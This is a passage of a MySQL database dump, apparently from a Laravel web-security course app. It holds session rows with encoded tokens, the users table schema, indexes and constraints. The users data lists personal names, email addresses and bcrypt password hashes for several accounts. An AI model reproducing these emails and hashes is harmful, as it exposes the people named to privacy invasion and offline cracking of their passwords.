('MhYxMvjv8Mv7LKboMlhBPZmtoKucu6QwHWDn5ODg', NULL, '127.0.0.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiMFd4U0NLZHl3ZmpzQTgzNXFKaEJhc2Y4NDJjaFAyVElzN2lINWdNTCI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6NDk2OiJodHRwOi8vd2Vic2Vjc2VydmljZS5sb2NhbGhvc3QuY29tL2NyeXB0b2dyYXBoeT9fdG9rZW49MFd4U0NLZHl3ZmpzQTgzNXFKaEJhc2Y4NDJjaFAyVElzN2lINWdNTCZhY3Rpb249S2V5UmVjaXZlJmRhdGE9RHN1N28lMkYxODFPQVpxQ0licFM2cUdvVGhuNnA0cjVJcmRiQTlrWVlweXdZY3hqZXZQT2l5OTAzdDFIc3o1ZnY5dEtWR1lmcmsxdDhvajFHeXNPVGluQ2NlMGZRc2JweVlFTGNEOTdmMCUyQmY4ZlBxYkc4cTFxbEVHcUdRQTRBV3ZjcW5FRyUyQiUyRnRlWVJxUlBDeGtwJTJGemI4VnpER1RlMU83ZEJKQXQ3aDBncXJVcm5TdW9zZDI1Y3pueXpzMDU4R2c4JTJGOVNwZEU2S0lFRWRZZmtleEIlMkJwUG1aS0t1YWRxbmNMWlFaMlJGUGdTZTN0UVJlclNQaXglMkJzaXV1dFpiMWxOb2RrcEZnc0tteXNnJTJCZXRYWXFBJTJCT2dMd0ZwTzJ3TXZ6JTJCVlpqcGppWWpkSFllRHJKOTJ2M3dKeG5KRFNDTm1vYVBFN0RHcUFmck96Rmp4TXV5YWRVSDE1ZyUzRCUzRCZyZXN1bHQ9Ijt9fQ==', 1746517959),
('WC5aSWuk1Nv8zlAPOOOU0oZ3UJevZqRVpdWb4qGg', NULL, '127.0.0.1', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36', 'YTozOntzOjY6Il90b2tlbiI7czo0MDoiZmY4WFBBN25sZTRUaUhwMUU5VFZ6ZTRSUjFFZnNNSEdvY2d1a2xMcyI7czo5OiJfcHJldmlvdXMiO2E6MTp7czozOiJ1cmwiO3M6NDU6Imh0dHBzOi8vd2Vic2Vjc2VydmljZS5sb2NhbGhvc3QuY29tL3dlYmNyeXB0byI7fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=', 1746508965);

-- --------------------------------------------------------

--
-- Table structure for table `users`
--

CREATE TABLE `users` (
  `id` bigint(20) UNSIGNED NOT NULL,
  `name` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `email_verified_at` timestamp NULL DEFAULT NULL,
  `password` varchar(255) DEFAULT NULL,
  `remember_token` varchar(100) DEFAULT NULL,
  `google_id` text DEFAULT NULL,
  `google_token` text DEFAULT NULL,
  `google_refresh_token` text DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  `credit` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `users`
--

INSERT INTO `users` (`id`, `name`, `email`, `email_verified_at`, `password`, `remember_token`, `google_id`, `google_token`, `google_refresh_token`, `created_at`, `updated_at`, `credit`) VALUES
(1, 'Mohamed Saleh', 'mohamed.saleh@sut.edu.eg', '2025-04-05 05:03:52', '$2y$12$NmCqiUwF4OfYn4eyuZaOhuT2IbJyQ394O/83jFSYtXJmfVZWgfCpi', NULL, NULL, NULL, NULL, '2025-03-10 16:34:55', '2025-05-12 23:05:19', 1111),
(16, 'Ahmed Ali Said', 'malisobh2010@gmail.com1', '2025-04-05 05:03:52', '$2y$12$cHhB7KEnGMKN2rrvmdX2POhwTv5yJC/wurAoHl8h/JAFGC5ZMezVi', NULL, NULL, NULL, NULL, '2025-03-11 05:32:37', '2025-03-18 01:54:30', 222),
(17, 'Nader Mohsen', 'nader.mohsen@gmail.com', '2025-04-05 05:03:52', '$2y$12$XKRIjZp2dELynmiLUgjWI.ecYWUeM3peE34SKh8/jYotKLaSy2EGS', NULL, NULL, NULL, NULL, '2025-03-18 01:02:26', '2025-03-18 01:59:02', 3333),
(37, 'Mohamed Sobh', 'malisobh2010@gmail.com', NULL, NULL, NULL, NULL, NULL, NULL, '2025-04-08 06:30:31', '2025-04-08 06:30:31', 4444),
(38, 'Test User', 'useremail@domain.com', '2025-05-01 06:28:45', '$2y$12$EmJ.tAsGA9N/qTYpkCwFTuXD6HWRw6s7JnJXWVaSu3n//nX3MkNJK', NULL, NULL, NULL, NULL, '2025-05-01 02:08:33', '2025-05-01 02:08:33', NULL);

--
-- Indexes for dumped tables
--

--
-- Indexes for table `cache`
--
ALTER TABLE `cache`
  ADD PRIMARY KEY (`key`);

--
-- Indexes for table `cache_locks`
--
ALTER TABLE `cache_locks`
  ADD PRIMARY KEY (`key`);

--
-- Indexes for table `failed_jobs`
--
ALTER TABLE `failed_jobs`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `failed_jobs_uuid_unique` (`uuid`);

--
-- Indexes for table `jobs`
--
ALTER TABLE `jobs`
  ADD PRIMARY KEY (`id`),
  ADD KEY `jobs_queue_index` (`queue`);

--
-- Indexes for table `job_batches`
--
ALTER TABLE `job_batches`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `migrations`
--
ALTER TABLE `migrations`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `model_has_permissions`
--
ALTER TABLE `model_has_permissions`
  ADD PRIMARY KEY (`permission_id`,`model_id`,`model_type`),
  ADD KEY `model_has_permissions_model_id_model_type_index` (`model_id`,`model_type`);

--
-- Indexes for table `model_has_roles`
--
ALTER TABLE `model_has_roles`
  ADD PRIMARY KEY (`role_id`,`model_id`,`model_type`),
  ADD KEY `model_has_roles_model_id_model_type_index` (`model_id`,`model_type`);

--
-- Indexes for table `oauth_access_tokens`
--
ALTER TABLE `oauth_access_tokens`
  ADD PRIMARY KEY (`id`),
  ADD KEY `oauth_access_tokens_user_id_index` (`user_id`);

--
-- Indexes for table `oauth_auth_codes`
--
ALTER TABLE `oauth_auth_codes`
  ADD PRIMARY KEY (`id`),
  ADD KEY `oauth_auth_codes_user_id_index` (`user_id`);

--
-- Indexes for table `oauth_clients`
--
ALTER TABLE `oauth_clients`
  ADD PRIMARY KEY (`id`),
  ADD KEY `oauth_clients_user_id_index` (`user_id`);

--
-- Indexes for table `oauth_personal_access_clients`
--
ALTER TABLE `oauth_personal_access_clients`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `oauth_refresh_tokens`
--
ALTER TABLE `oauth_refresh_tokens`
  ADD PRIMARY KEY (`id`),
  ADD KEY `oauth_refresh_tokens_access_token_id_index` (`access_token_id`);

--
-- Indexes for table `participations`
--
ALTER TABLE `participations`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `password_reset_tokens`
--
ALTER TABLE `password_reset_tokens`
  ADD PRIMARY KEY (`email`);

--
-- Indexes for table `permissions`
--
ALTER TABLE `permissions`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `permissions_name_guard_name_unique` (`name`,`guard_name`);

--
-- Indexes for table `products`
--
ALTER TABLE `products`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `quizzes`
--
ALTER TABLE `quizzes`
  ADD PRIMARY KEY (`id`);

--
-- Indexes for table `roles`
--
ALTER TABLE `roles`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `roles_name_guard_name_unique` (`name`,`guard_name`);

--
-- Indexes for table `role_has_permissions`
--
ALTER TABLE `role_has_permissions`
  ADD PRIMARY KEY (`permission_id`,`role_id`),
  ADD KEY `role_has_permissions_role_id_foreign` (`role_id`);

--
-- Indexes for table `sessions`
--
ALTER TABLE `sessions`
  ADD PRIMARY KEY (`id`),
  ADD KEY `sessions_user_id_index` (`user_id`),
  ADD KEY `sessions_last_activity_index` (`last_activity`);

--
-- Indexes for table `users`
--
ALTER TABLE `users`
  ADD PRIMARY KEY (`id`),
  ADD UNIQUE KEY `users_email_unique` (`email`),
  ADD UNIQUE KEY `google_id` (`google_id`) USING HASH;

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `failed_jobs`
--
ALTER TABLE `failed_jobs`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `jobs`
--
ALTER TABLE `jobs`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `migrations`
--
ALTER TABLE `migrations`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;

--
-- AUTO_INCREMENT for table `oauth_personal_access_clients`
--
ALTER TABLE `oauth_personal_access_clients`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- AUTO_INCREMENT for table `participations`
--
ALTER TABLE `participations`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `permissions`
--
ALTER TABLE `permissions`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=9;

--
-- AUTO_INCREMENT for table `products`
--
ALTER TABLE `products`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=23;

--
-- AUTO_INCREMENT for table `quizzes`
--
ALTER TABLE `quizzes`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT;

--
-- AUTO_INCREMENT for table `roles`
--
ALTER TABLE `roles`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- AUTO_INCREMENT for table `users`
--
ALTER TABLE `users`
  MODIFY `id` bigint(20) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=39;

--
-- Constraints for dumped tables
--

--
-- Constraints for table `model_has_permissions`
--
ALTER TABLE `model_has_permissions`
  ADD CONSTRAINT `model_has_permissions_permission_id_foreign` FOREIGN KEY (`permission_id`) REFERENCES `permissions` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `model_has_roles`
--
ALTER TABLE `model_has_roles`
  ADD CONSTRAINT `model_has_roles_role_id_foreign` FOREIGN KEY (`role_id`) REFERENCES `roles` (`id`) ON DELETE CASCADE;

--
-- Constraints for table `role_has_permissions`
--
ALTER TABLE `role_has_permissions`
  ADD CONSTRAINT `role_has_permissions_permission_id_foreign` FOREIGN KEY (`permission_id`) REFERENCES `permissions` (`id`) ON DELETE CASCADE,
  ADD CONSTRAINT `role_has_permissions_role_id_foreign` FOREIGN KEY (`role_id`) REFERENCES `roles` (`id`) ON DELETE CASCADE;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
